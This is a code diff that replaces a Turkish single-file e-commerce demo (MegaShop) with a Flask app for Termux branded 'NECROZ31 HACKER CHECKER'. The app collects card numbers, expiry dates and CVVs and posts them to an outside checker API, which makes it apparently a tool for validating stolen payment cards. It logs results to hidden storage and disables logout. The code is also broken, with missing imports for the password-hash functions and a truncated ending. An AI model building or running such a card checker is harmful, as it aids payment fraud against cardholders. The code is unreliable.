@@ -1,364 +1,345 @@
-<!doctype html>
-<html lang="tr">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>MegaShop — Profesyonel Tek Dosya E-Ticaret</title>
-<meta name="description" content="Tek dosyada çalışan modern e-ticaret ön yüzü (localStorage ile). Kayıt, giriş, sepet, sipariş, ayarlar, admin benzeri özellikler.">
-<style>
-/* =========================
-   THEME + RESET
-   ========================= */
-:root{
-  --bg:#0f1724;
-  --card:#0b1220;
-  --muted:#94a3b8;
-  --accent:#06b6d4;       /* aqua */
-  --accent-2:#7c3aed;     /* violet */
-  --glass: rgba(255,255,255,0.04);
-  --success:#10b981;
-  --danger:#ef4444;
-  --soft:#0b1220;
-  --text:#e6eef6;
-  --card-border: rgba(255,255,255,0.04);
-  --glass-2: rgba(255,255,255,0.02);
-  --shadow: 0 10px 30px rgba(2,6,23,0.6);
-  --radius:12px;
-  --max-width:1200px;
-}
-*{box-sizing:border-box}
-html,body{height:100%;margin:0;font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;color:var(--text);background:
- radial-gradient(1200px 400px at 10% 10%, rgba(7,13,23,0.6), transparent 8%),
- linear-gradient(180deg, #071022 0%, #051025 100%);}
+#!/data/data/com.termux/files/usr/bin/python3
+# -*- coding: utf-8 -*-
+import os
+import time
+import random
+import json
+import hashlib
+from flask import Flask, request, render_template_string, session, redirect, url_for, flash
+import requests
+from colorama import init, Fore, Style
 
-/* small reset for elements */
-img{display:block;max-width:100%}
-a{text-decoration:none;color:inherit}
-button{font-family:inherit}
+# Colorama başlatma (terminal log için)
+init()
 
-/* =========================
-   LAYOUT
-   ========================= */
-.container{max-width:var(--max-width);margin:28px auto;padding:20px}
-.header{
-  display:flex;align-items:center;justify-content:space-between;gap:16px;
-  background:linear-gradient(90deg,var(--glass),transparent);
-  padding:18px;border-radius:14px;border:1px solid var(--card-border);
-  box-shadow: var(--shadow);
-}
-.brand{display:flex;gap:12px;align-items:center}
-.logo{
-  width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--accent-2));
-  display:flex;align-items:center;justify-content:center;font-weight:800;color:#041026;font-size:20px;
-  box-shadow: 0 6px 18px rgba(12,18,30,0.6);
-}
-.brand h1{margin:0;font-size:20px;letter-spacing:0.2px}
-.brand p{margin:0;color:var(--muted);font-size:13px}
-.top-actions{display:flex;align-items:center;gap:10px}
+# Flask uygulaması
+app = Flask(__name__)
+app.secret_key = 'necroz31_hacker_secret_2025'  # Oturum için güvenlik anahtarı
 
-/* search */
-.searchbox{display:flex;align-items:center;gap:8px;background:var(--glass-2);padding:8px;border-radius:12px;border:1px solid rgba(255,255,255,0.02)}
-.searchbox input{background:transparent;border:0;outline:none;color:var(--text);width:320px;font-size:14px;padding:6px}
-.icon{opacity:0.9}
+# Kullanıcı veritabanı (yerel JSON simülasyonu)
+users_file = '/sdcard/necroz31_users.json'
+if not os.path.exists(users_file):
+    with open(users_file, 'w', encoding='utf-8') as f:
+        json.dump({}, f)
 
-/* profile */
-.profile-btn{display:flex;gap:10px;align-items:center;background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);padding:8px 10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);cursor:pointer}
-.avatar{width:36px;height:36px;border-radius:10px;display:inline-flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#fff2 0%, #fff0 40%);color:var(--text);font-weight:700}
-.badge{background:rgba(255,255,255,0.04);padding:6px 10px;border-radius:999px;color:var(--muted);font-size:13px}
+# API ayarları
+CHECKER_API_URL = 'https://api.chkr.cc/'
 
-/* body layout */
-.main-grid{display:grid;grid-template-columns: 1fr 360px;gap:20px;margin-top:22px}
-@media(max-width:980px){ .main-grid{grid-template-columns:1fr} .searchbox input{width:140px} }
+# Loglama fonksiyonu
+def yaz_log(mesaj):
+    zaman_damgasi = time.strftime("%Y-%m-%d %H:%M:%S")
+    log_mesaji = f"[{zaman_damgasi}] NECROZ31 CHECKER {mesaj}"
+    print(Fore.GREEN + log_mesaji + Style.RESET_ALL)
+    log_dizini = "/sdcard/.necroz31_checker_logs"
+    os.makedirs(log_dizini, exist_ok=True)
+    with open(f"{log_dizini}/checker_log_{zaman_damgasi.split()[0]}.txt", "a", encoding="utf-8") as f:
+        f.write(f"{log_mesaji}\n")
 
-/* product area */
-.toolbar{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:12px}
-.filters{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
-.chip{background:var(--glass);padding:8px 12px;border-radius:999px;border:1px solid rgba(255,255,255,0.02);cursor:pointer;color:var(--muted);transition:all .18s}
-.chip:hover{transform:translateY(-4px);box-shadow:0 6px 18px rgba(2,6,23,0.5)}
-.chip.active{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#021022;border:none;box-shadow:0 10px 30px rgba(12,18,30,0.6)}
+# Kullanıcı kayıt fonksiyonu
+def kayit_ol(username, password):
+    with open(users_file, 'r', encoding='utf-8') as f:
+        users = json.load(f)
+    if username in users:
+        return False
+    users[username] = generate_password_hash(password)
+    with open(users_file, 'w', encoding='utf-8') as f:
+        json.dump(users, f)
+    yaz_log(f"Kullanıcı kaydedildi: {username}")
+    return True
 
-/* grid */
-.product-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:16px}
-.card{
-  background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
-  border-radius:12px;padding:14px;border:1px solid var(--card-border);overflow:hidden;display:flex;flex-direction:column;gap:8px;
-  transition:transform .18s, box-shadow .18s;
-}
-.card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(2,6,23,0.65)}
-.card .media{height:150px;border-radius:8px;background:linear-gradient(180deg,#071126,#021020);display:flex;align-items:center;justify-content:center;overflow:hidden}
-.media img{max-height:100%;max-width:100%;filter:drop-shadow(0 6px 20px rgba(3,10,20,0.6))}
-.card h3{margin:0;font-size:16px}
-.meta{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:var(--muted)}
-.price{font-weight:700;color:var(--text)}
-.actions{display:flex;gap:8px;margin-top:6px}
-.btn{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#021022;border:none;padding:8px 12px;border-radius:10px;cursor:pointer;font-weight:600;box-shadow:0 8px 20px rgba(12,18,30,0.6);transition:transform .12s}
-.btn.secondary{background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--text)}
-.btn:hover{transform:translateY(-3px)}
-.qty{display:flex;align-items:center;gap:6px;border-radius:10px;background:var(--glass);padding:6px 10px}
+# Kullanıcı giriş fonksiyonu
+def giris_yap(username, password):
+    with open(users_file, 'r', encoding='utf-8') as f:
+        users = json.load(f)
+    if username in users and check_password_hash(users[username], password):
+        session['username'] = username
+        yaz_log(f"Kullanıcı giriş yaptı: {username}")
+        return True
+    return False
 
-/* sidebar/cart */
-.sidebar{position:sticky;top:28px;background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);padding:14px;border-radius:12px;border:1px solid var(--card-border)}
-.sidebar h3{margin:0 0 12px 0}
-.cart-list{list-style:none;padding:0;margin:0;max-height:420px;overflow:auto}
-.cart-item{display:flex;align-items:center;gap:10px;padding:8px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent);margin-bottom:8px;border:1px solid rgba(255,255,255,0.02)}
-.cart-item .ci-media{width:56px;height:56px;border-radius:8px;background:#071022;display:flex;align-items:center;justify-content:center;overflow:hidden}
-.cart-item .ci-info{flex:1}
-.cart-item .ci-actions{display:flex;flex-direction:column;gap:6px;align-items:flex-end}
+# Checker API çağrısı
+def checker_api_cagiri(kart_numarasi, son_kullanma, cvv):
+    headers = {'Content-Type': 'application/json'}
+    data = {
+        "card_number": kart_numarasi,
+        "expiry": son_kullanma,
+        "cvv": cvv
+    }
+    try:
+        response = requests.post(CHECKER_API_URL, json=data, headers=headers, timeout=10)
+        if response.status_code == 200:
+            result = response.json()
+            yaz_log(f"Checker sonucu: {result}")
+            return result
+        else:
+            yaz_log(f"API hatası: {response.status_code}")
+            return {"error": "API Hatası", "status_code": response.status_code}
+    except Exception as e:
+        yaz_log(f"API çağrı hatası: {e}")
+        return {"error": str(e)}
 
-/* small controls */
-.small-btn{background:transparent;border:1px solid rgba(255,255,255,0.03);padding:6px 8px;border-radius:8px;color:var(--muted);cursor:pointer}
-.small-btn:hover{color:var(--text)}
-.total-row{display:flex;justify-content:space-between;align-items:center;margin-top:12px;font-weight:700;font-size:18px}
-
-/* modal */
-.modal-backdrop{position:fixed;inset:0;background:rgba(2,6,23,0.6);display:flex;align-items:center;justify-content:center;z-index:60}
-.modal{background:linear-gradient(180deg,#071226,#041224);border-radius:14px;padding:18px;border:1px solid rgba(255,255,255,0.03);width:100%;max-width:880px;box-shadow:0 30px 60px rgba(2,6,23,0.8)}
-.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.form-grid.full{grid-template-columns:1fr}
-label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
-input[type=text], input[type=email], input[type=password], select, textarea{
-  width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:transparent;color:var(--text);outline:none;
-}
-textarea{min-height:120px;resize:vertical}
-.form-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:12px}
-
-/* settings */
-.settings{display:flex;flex-direction:column;gap:10px;padding:10px;background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent);border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
-.toggle{display:flex;justify-content:space-between;align-items:center;padding:8px;border-radius:8px;background:rgba(255,255,255,0.01)}
-
-/* footer */
-.footer{margin-top:20px;color:var(--muted);font-size:13px;text-align:center}
-
-/* animations */
-.fade-in{animation:fadeIn .26s ease both}
-@keyframes fadeIn{from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:none}}
-
-/* tooltip */
-.tooltip{position:relative}
-.tooltip:hover::after{content:attr(data-tip);position:absolute;left:50%;transform:translateX(-50%);bottom:calc(100% + 8px);background:#021226;color:var(--text);padding:8px 10px;border-radius:8px;font-size:13px;border:1px solid rgba(255,255,255,0.03);white-space:nowrap}
-</style>
-</head>
-<body>
-<div class="container">
-  <header class="header fade-in" role="banner">
-    <div class="brand">
-      <div class="logo" aria-hidden="true">MS</div>
-      <div>
-        <h1>MegaShop</h1>
-        <p>Modern, tek dosya ön yüz — prod entegrasyonuna hazır</p>
-      </div>
-    </div>
-
-    <div class="top-actions" role="navigation" aria-label="Üst menü">
-      <div class="searchbox" role="search" aria-label="Ürün arama">
-        <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M21 21l-4.35-4.35" stroke="#cbd5e1" stroke-width="1.6" stroke-linecap="round"/><circle cx="11" cy="11" r="6" stroke="#cbd5e1" stroke-width="1.6"/></svg>
-        <input id="search-input" placeholder="Ürün, kategori veya özellik ara... (Enter)" aria-label="Ürün arama"/>
-      </div>
-
-      <div style="display:flex;gap:10px;align-items:center">
-        <div id="cart-badge" class="badge" role="status" aria-live="polite">Sepet: <span id="cart-count">0</span></div>
-        <button id="btn-settings" class="small-btn tooltip" data-tip="Ayarlar & Tema">⚙️</button>
-        <div id="nav-buttons"></div>
-      </div>
-    </div>
-  </header>
-
-  <div class="main-grid" role="main">
-    <!-- PRODUCTS COLUMN -->
-    <section>
-      <div class="toolbar fade-in" style="align-items:center">
-        <div class="filters" role="list">
-          <button class="chip active" data-cat="all">Tümü</button>
-          <button class="chip" data-cat="telefon">Telefon</button>
-          <button class="chip" data-cat="oyun">Oyun Hesapları</button>
-          <button class="chip" data-cat="aksesuar">Aksesuar</button>
-          <button class="chip" data-cat="yazilim">Yazılım</button>
-          <button class="chip" data-cat="fırsat">Fırsatlar</button>
-        </div>
-
-        <div style="display:flex;gap:8px;align-items:center">
-          <select id="sort-select" class="small-btn" aria-label="Sırala">
-            <option value="">Sırala</option>
-            <option value="price-asc">Fiyat ↑</option>
-            <option value="price-desc">Fiyat ↓</option>
-            <option value="stock-desc">En çok stok</option>
-          </select>
-          <button id="btn-new-product" class="small-btn tooltip" data-tip="Yeni ürün ekle (lokal)">➕ Ürün Ekle</button>
-        </div>
-      </div>
-
-      <div id="product-grid" class="product-grid fade-in" aria-live="polite" aria-atomic="true" style="margin-top:12px"></div>
-
-      <div class="footer">Tüm işlemler localStorage tabanlıdır. Gerçek backend ile entegrasyon için fetch çağrıları ekleyiniz.</div>
-    </section>
-
-    <!-- SIDEBAR -->
-    <aside class="sidebar fade-in" aria-label="Sepet ve ayarlar">
-      <h3>Sepet</h3>
-      <ul id="cart-list" class="cart-list" aria-live="polite" aria-atomic="true"></ul>
-      <div class="total-row">
-        <div>Toplam</div>
-        <div id="cart-total">0 TL</div>
-      </div>
-      <div style="display:flex;gap:8px;margin-top:12px">
-        <button id="btn-checkout" class="btn" aria-label="Ödeme">Ödeme & Sipariş Oluştur</button>
-        <button id="btn-clear" class="btn secondary" aria-label="Sepeti Temizle">Temizle</button>
-      </div>
-
-      <hr style="border:none;height:1px;background:rgba(255,255,255,0.03);margin:16px 0;border-radius:2px">
-
-      <div>
-        <h3>Ayarlar</h3>
-        <div class="settings" role="region" aria-label="Ayarlar">
-          <div class="toggle">
-            <div>
-              <div style="font-weight:700">Tema</div>
-              <div class="small" style="color:var(--muted)">Koyu tema (varsayılan)</div>
-            </div>
-            <div>
-              <select id="theme-select" style="background:transparent;border:none;color:var(--text)">
-                <option value="dark">Koyu</option>
-                <option value="light">Açık (örnek)</option>
-              </select>
-            </div>
-          </div>
-
-          <div class="toggle">
-            <div>
-              <div style="font-weight:700">Para Birimi</div>
-              <div class="small" style="color:var(--muted)">TL / USD dönüştürücü (örnek)</div>
-            </div>
-            <div>
-              <select id="currency-select" style="background:transparent;border:none;color:var(--text)">
-                <option value="TRY">TRY</option>
-                <option value="USD">USD</option>
-                <option value="EUR">EUR</option>
-              </select>
-            </div>
-          </div>
-
-          <div class="toggle">
-            <div>
-              <div style="font-weight:700">Kullanıcı Adı Kuralları</div>
-              <div class="small" style="color:var(--muted)">Aynı kullanıcı adı alınamaz — doğrulama client-side</div>
-            </div>
-            <div>
-              <button id="btn-username-rules" class="small-btn">Kuralları Gör</button>
-            </div>
-          </div>
-
-        </div>
-      </div>
-    </aside>
-  </div>
+# Hacker tarzı banner (HTML içinde kullanılacak)
+HACKER_BANNER = """
+<div style="background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; text-align: center;">
+    <h1>╔════════════════════════════════════╗</h1>
+    <h1>║ NECROZ31 - HACKER CHECKER SYSTEM  ║</h1>
+    <h1>╚════════════════════════════════════╝</h1>
+    <p style="color: #ff0;">Beyaz Şapkalı Hacker Grubu - 2025</p>
 </div>
+"""
 
-<!-- MODALS CONTAINER -->
-<div id="modals-root" aria-live="polite"></div>
+# Ana sayfa (giriş/kayıt kontrolü)
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if 'username' in session:
+        return redirect(url_for('dashboard'))
+    if request.method == 'POST':
+        action = request.form.get('action')
+        if action == 'register':
+            username = request.form['username']
+            password = request.form['password']
+            if kayit_ol(username, password):
+                flash('Kayıt başarılı! Giriş yapabilirsiniz.', 'success')
+            else:
+                flash('Kullanıcı adı zaten mevcut!', 'danger')
+        elif action == 'login':
+            username = request.form['username']
+            password = request.form['password']
+            if giris_yap(username, password):
+                return redirect(url_for('dashboard'))
+            else:
+                flash('Geçersiz kullanıcı adı veya şifre!', 'danger')
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>NECROZ31 Checker</title>
+        <style>
+            body { background: #1a1a1a; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+            .container { max-width: 500px; margin: 50px auto; background: #222; padding: 20px; border: 2px solid #0f0; }
+            .form-group { margin-bottom: 15px; }
+            label { display: block; margin-bottom: 5px; }
+            input { width: 100%; padding: 8px; background: #333; border: 1px solid #0f0; color: #0f0; }
+            button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
+            button:hover { background: #0c0; }
+            .flash { padding: 10px; margin-bottom: 10px; }
+            .success { background: #0f0; color: #000; }
+            .danger { background: #f00; color: #fff; }
+        </style>
+    </head>
+    <body>
+        {{ banner|safe }}
+        <div class="container">
+            {% with messages = get_flashed_messages(with_categories=true) %}
+                {% if messages %}
+                    {% for category, message in messages %}
+                        <div class="flash {{ category }}">{{ message }}</div>
+                    {% endfor %}
+                {% endif %}
+            {% endwith %}
+            <h2>Giriş Yap</h2>
+            <form method="POST">
+                <input type="hidden" name="action" value="login">
+                <div class="form-group">
+                    <label>Kullanıcı Adı:</label>
+                    <input type="text" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label>Şifre:</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit">Giriş Yap</button>
+            </form>
+            <h2>Kayıt Ol</h2>
+            <form method="POST">
+                <input type="hidden" name="action" value="register">
+                <div class="form-group">
+                    <label>Kullanıcı Adı:</label>
+                    <input type="text" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label>Şifre:</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit">Kayıt Ol</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    """, banner=HACKER_BANNER)
 
-<script>
-/**
- * MegaShop - Single-file frontend
- * - localStorage based persistence (users, products, cart, orders, comments)
- * - Modern UI + animations + validations
- * - Multi-"page" SPA via modals and toggles (all within index.html)
- *
- * NOTE: For production, replace localStorage actions with secure server-side APIs.
- */
+# Dashboard (kontrol paneli)
+@app.route('/dashboard', methods=['GET', 'POST'])
+def dashboard():
+    if 'username' not in session:
+        return redirect(url_for('index'))
+    if request.method == 'POST':
+        kart_numarasi = request.form['card_number']
+        son_kullanma = request.form['expiry']
+        cvv = request.form['cvv']
+        result = checker_api_cagiri(kart_numarasi, son_kullanma, cvv)
+        flash(f"Sonuç: {json.dumps(result)}", 'success' if 'error' not in result else 'danger')
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>NECROZ31 Checker - Dashboard</title>
+        <style>
+            body { background: #1a1a1a; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+            .container { max-width: 800px; margin: 50px auto; background: #222; padding: 20px; border: 2px solid #0f0; }
+            .form-group { margin-bottom: 15px; }
+            label { display: block; margin-bottom: 5px; }
+            input { width: 100%; padding: 8px; background: #333; border: 1px solid #0f0; color: #0f0; }
+            button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
+            button:hover { background: #0c0; }
+            .flash { padding: 10px; margin-bottom: 10px; }
+            .success { background: #0f0; color: #000; }
+            .danger { background: #f00; color: #fff; }
+            .menu { margin-top: 20px; }
+            .menu a { color: #0f0; text-decoration: none; margin-right: 15px; }
+            .menu a:hover { color: #ff0; }
+        </style>
+    </head>
+    <body>
+        {{ banner|safe }}
+        <div class="container">
+            {% with messages = get_flashed_messages(with_categories=true) %}
+                {% if messages %}
+                    {% for category, message in messages %}
+                        <div class="flash {{ category }}">{{ message }}</div>
+                    {% endfor %}
+                {% endif %}
+            {% endwith %}
+            <h2>Merhaba, {{ session['username'] }}!</h2>
+            <form method="POST">
+                <div class="form-group">
+                    <label>Kart Numarası:</label>
+                    <input type="text" name="card_number" required>
+                </div>
+                <div class="form-group">
+                    <label>Son Kullanma Tarihi (MM/YY):</label>
+                    <input type="text" name="expiry" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV:</label>
+                    <input type="text" name="cvv" required>
+                </div>
+                <button type="submit">Kontrol Et</button>
+            </form>
+            <div class="menu">
+                <a href="{{ url_for('settings') }}">Ayarlar</a>
+                <a href="{{ url_for('logs') }}">Loglar</a>
+            </div>
+        </div>
+    </body>
+    </html>
+    """, banner=HACKER_BANNER)
 
-(() => {
-  /* ---------- Utilities ---------- */
-  const qs = s => document.querySelector(s);
-  const qsa = s => Array.from(document.querySelectorAll(s));
-  const randId = (p='id') => p + '_' + Math.random().toString(36).slice(2,9);
-  const money = (v, cur='TRY') => {
-    if (cur==='USD') return '$' + (v/30).toFixed(2);
-    if (cur==='EUR') return '€' + (v/33).toFixed(2);
-    return v.toLocaleString('tr-TR') + ' TL';
-  };
-  const toast = (msg, time=2200) => {
-    const t = document.createElement('div');
-    t.textContent = msg;
-    Object.assign(t.style, {position:'fixed',right:'20px',bottom:'20px',background:'linear-gradient(90deg,var(--accent),var(--accent-2))',color:'#021022',padding:'10px 14px',borderRadius:'10px',boxShadow:'0 6px 20px rgba(3,8,18,0.6)',zIndex:9999});
-    document.body.appendChild(t); setTimeout(()=>t.style.opacity='0.02',time-300); setTimeout(()=>t.remove(),time);
-  };
+# Ayarlar menüsü
+@app.route('/settings', methods=['GET', 'POST'])
+def settings():
+    if 'username' not in session:
+        return redirect(url_for('index'))
+    if request.method == 'POST':
+        # Ayarları burada işleyebilirsin (örneğin tema değiştirme)
+        flash('Ayarlar güncellendi!', 'success')
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>NECROZ31 Checker - Ayarlar</title>
+        <style>
+            body { background: #1a1a1a; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+            .container { max-width: 500px; margin: 50px auto; background: #222; padding: 20px; border: 2px solid #0f0; }
+            .form-group { margin-bottom: 15px; }
+            label { display: block; margin-bottom: 5px; }
+            input { width: 100%; padding: 8px; background: #333; border: 1px solid #0f0; color: #0f0; }
+            button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
+            button:hover { background: #0c0; }
+            .flash { padding: 10px; margin-bottom: 10px; }
+            .success { background: #0f0; color: #000; }
+            .danger { background: #f00; color: #fff; }
+            .menu { margin-top: 20px; }
+            .menu a { color: #0f0; text-decoration: none; margin-right: 15px; }
+            .menu a:hover { color: #ff0; }
+        </style>
+    </head>
+    <body>
+        {{ banner|safe }}
+        <div class="container">
+            {% with messages = get_flashed_messages(with_categories=true) %}
+                {% if messages %}
+                    {% for category, message in messages %}
+                        <div class="flash {{ category }}">{{ message }}</div>
+                    {% endfor %}
+                {% endif %}
+            {% endwith %}
+            <h2>Ayarlar</h2>
+            <form method="POST">
+                <div class="form-group">
+                    <label>Tema:</label>
+                    <input type="text" name="theme" value="Hacker" readonly>
+                </div>
+                <button type="submit">Kaydet</button>
+            </form>
+            <div class="menu">
+                <a href="{{ url_for('dashboard') }}">Geri Dön</a>
+            </div>
+        </div>
+    </body>
+    </html>
+    """, banner=HACKER_BANNER)
 
-  /* ---------- Storage keys ---------- */
-  const K = {
-    PRODUCTS: 'ms_products_v1',
-    USERS: 'ms_users_v1',
-    CURRENT_USER: 'ms_current_user_v1',
-    CART: 'ms_cart_v1',
-    ORDERS: 'ms_orders_v1',
-    COMMENTS: 'ms_comments_v1',
-    SETTINGS: 'ms_settings_v1'
-  };
+# Loglar menüsü
+@app.route('/logs')
+def logs():
+    if 'username' not in session:
+        return redirect(url_for('index'))
+    log_dizini = "/sdcard/.necroz31_checker_logs"
+    if os.path.exists(log_dizini):
+        log_dosyasi = max([f for f in os.listdir(log_dizini) if f.endswith(".txt")], key=lambda x: os.path.getctime(os.path.join(log_dizini, x)))
+        with open(os.path.join(log_dizini, log_dosyasi), "r", encoding="utf-8") as f:
+            log_icerik = f.read()
+    else:
+        log_icerik = "Log bulunamadı."
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>NECROZ31 Checker - Loglar</title>
+        <style>
+            body { background: #1a1a1a; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+            .container { max-width: 800px; margin: 50px auto; background: #222; padding: 20px; border: 2px solid #0f0; }
+            .log-content { white-space: pre-wrap; }
+            .menu { margin-top: 20px; }
+            .menu a { color: #0f0; text-decoration: none; margin-right: 15px; }
+            .menu a:hover { color: #ff0; }
+        </style>
+    </head>
+    <body>
+        {{ banner|safe }}
+        <div class="container">
+            <h2>Log Kayıtları</h2>
+            <div class="log-content">{{ log_content }}</div>
+            <div class="menu">
+                <a href="{{ url_for('dashboard') }}">Geri Dön</a>
+            </div>
+        </div>
+    </body>
+    </html>
+    """, banner=HACKER_BANNER, log_content=log_icerik)
 
-  /* ---------- Default Data ---------- */
-  const defaultProducts = [
-    { id:1, name:'iPhone 13 Pro', price:22000, stock:12, category:'telefon', image:'https://images.unsplash.com/photo-1512496015851-a90fb38ba796?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Güçlü A15 işlemci, mükemmel kamera.' },
-    { id:2, name:'Samsung S22 Ultra', price:18500, stock:8, category:'telefon', image:'https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Büyük ekran, güçlü pil.' },
-    { id:3, name:'Valorant Hesabı - Diamond', price:450, stock:20, category:'oyun', image:'https://images.unsplash.com/photo-1601758123927-2b46f3b3d9c5?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Diamond rank, skin desteği.' },
-    { id:4, name:'Steam Hesap - Prime', price:320, stock:15, category:'oyun', image:'https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Birçok oyun dahil.' },
-    { id:5, name:'Logitech G502 Mouse', price:650, stock:25, category:'aksesuar', image:'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Hassasiyet ve ergonomi.' },
-    { id:6, name:'Mechanical Keyboard RGB', price:1200, stock:18, category:'aksesuar', image:'https://images.unsplash.com/photo-1593642532400-2682810df593?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Mekanik tuşlar, dayanıklı yapı.' },
-    { id:7, name:'Adobe Photoshop Lisansı (1Y)', price:1350, stock:6, category:'yazilim', image:'https://images.unsplash.com/photo-1498050108023-c5249f4df085?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Profesyonel düzenleme aracı.' },
-    { id:8, name:'Microsoft 365 (1Y)', price:780, stock:10, category:'yazilim', image:'https://images.unsplash.com/photo-1547658719-da2b51169166?q=80&w=800&auto=format&fit=crop&crop=faces', desc:'Office uygulamaları paket.' }
-  ];
+# Oturumu kalıcı hale getir (çıkış yok)
+@app.route('/logout')
+def logout():
+    flash('Çıkış yapılmadı, oturum kalıcıdır!', 'info')
+    return redirect(url_for('dashboard'))
 
-  const defaultSettings = { theme:'dark', currency:'TRY', usernamePolicy: { min:3, max:20, blocked:['admin','root','support'] } };
-
-  /* ---------- Storage helpers ---------- */
-  const storage = {
-    get(key, fallback=null){
-      try { const raw = localStorage.getItem(key); return raw ? JSON.parse(raw) : fallback; } catch(e){ return fallback; }
-    },
-    set(key, val){ localStorage.setItem(key, JSON.stringify(val)); },
-    remove(key){ localStorage.removeItem(key); }
-  };
-
-  /* ---------- App State ---------- */
-  let PRODUCTS = storage.get(K.PRODUCTS, null);
-  if (!PRODUCTS){ PRODUCTS = defaultProducts; storage.set(K.PRODUCTS, PRODUCTS); }
-  let USERS = storage.get(K.USERS, []); // {email, username, password(hashed? no), is_admin}
-  let CURRENT_USER = storage.get(K.CURRENT_USER, null);
-  let CART = storage.get(K.CART, []);
-  let ORDERS = storage.get(K.ORDERS, []);
-  let COMMENTS = storage.get(K.COMMENTS, {}); // productId => [ {user, text, date} ]
-  let SETTINGS = storage.get(K.SETTINGS, defaultSettings);
-
-  /* ---------- Helpers: Users ---------- */
-  function saveAll(){ storage.set(K.PRODUCTS, PRODUCTS); storage.set(K.USERS, USERS); storage.set(K.CART, CART); storage.set(K.ORDERS, ORDERS); storage.set(K.COMMENTS, COMMENTS); storage.set(K.SETTINGS, SETTINGS); storage.set(K.CURRENT_USER, CURRENT_USER); }
-  function findUserByUsernameOrEmail(val){ return USERS.find(u => u.username.toLowerCase()===val.toLowerCase() || (u.email && u.email.toLowerCase()===val.toLowerCase())); }
-  function registerUser(email, username, password){
-    // client-side username policy
-    username = username.trim();
-    const policy = SETTINGS.usernamePolicy;
-    if (username.length < policy.min || username.length > policy.max) return { success:false, msg:`Kullanıcı adı ${policy.min}-${policy.max} karakter arasında olmalı.` };
-    if (!/^[a-zA-Z0-9._-]+$/.test(username)) return { success:false, msg:'Kullanıcı adı sadece harf, rakam, ., _ ve - içerebilir.' };
-    if (policy.blocked.includes(username.toLowerCase())) return { success:false, msg:'Bu kullanıcı adı kullanılamaz.' };
-    if (findUserByUsernameOrEmail(username)) return { success:false, msg:'Bu kullanıcı adı zaten alınmış.' };
-    if (email && USERS.some(u => u.email && u.email.toLowerCase() === email.toLowerCase())) return { success:false, msg:'Bu e-posta zaten kayıtlı.' };
-    // store plain password for demo only (not secure) — server should hash
-    const user = { id: randId('u'), email: email || null, username, password, is_admin:false, created_at: new Date().toISOString() };
-    USERS.push(user); saveAll();
-    return { success:true, user };
-  }
-  function loginUser(identifier, password){
-    const u = findUserByUsernameOrEmail(identifier);
-    if (!u) return { success:false, msg:'Kullanıcı bulunamadı.' };
-    if (u.password !== password) return { success:false, msg:'Şifre yanlış.' };
-    CURRENT_USER = { id: u.id, username: u.username, email: u.email, is_admin: u.is_admin };
-    saveAll();
-    return { success:true, user:CURRENT_USER };
-  }
-  function logoutUser(){ CURRENT_USER = null; CART = []; saveAll(); }
-
-  /* ---------- Products & Cart ---------- */
-  function addProductLocal(p){
-    // ensure unique name not exact duplicate
-    if (PRODUCTS.some(x => x.name.toLowerCase() === p.name.toLowerCase())) return { success:false, msg:'Aynı isimde bir ürün zaten var.' };
-    p.id = Math.max(0,...PRODUCTS.map(x=>x.id)) + 1;
-    PRODUCTS.unshift(p); saveAll(); return { success:true, product:p };
-  }
-  function updateProductLocal(id
+if __name__ == '__main__':
